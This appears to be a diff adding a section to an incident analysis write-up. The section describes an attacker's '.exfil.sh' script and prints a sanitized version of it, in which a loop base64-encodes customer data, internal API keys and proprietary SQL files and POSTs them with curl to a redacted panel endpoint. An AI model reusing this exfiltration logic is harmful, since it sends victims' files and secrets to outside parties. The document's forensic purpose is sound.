@@ -52,3 +52,41 @@ api_keys_internal.yaml
 route_algorithms_PROPRIETARY.sql
 customers.sql
 .exfil.sh
+
+```
+
+🕵️ 3. Discovering .exfil.sh
+
+The script revealed information about how the attackers were transferring
+stolen files to their infrastructure.
+
+It contained:
+
+A panel address
+An API endpoint
+An authentication header
+An upload action
+A list of files being exfiltrated
+Base64 encoding of file contents
+
+A sanitized representation of the relevant logic looked like:
+
+PANEL="[REDACTED]"
+KEY="[REDACTED]"
+
+
+TARGETS=(
+    "route_algorithms_PROPRIETARY.sql"
+    "customers.sql"
+    "api_keys_internal.yaml"
+)
+
+
+for f in "${TARGETS[@]}"; do
+    b64=$(base64 -w0 "$f")
+
+
+    curl -s -X POST "${PANEL}/api.php?action=upload" \
+        -H "X-Panel-Key: [REDACTED]" \
+        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
+done
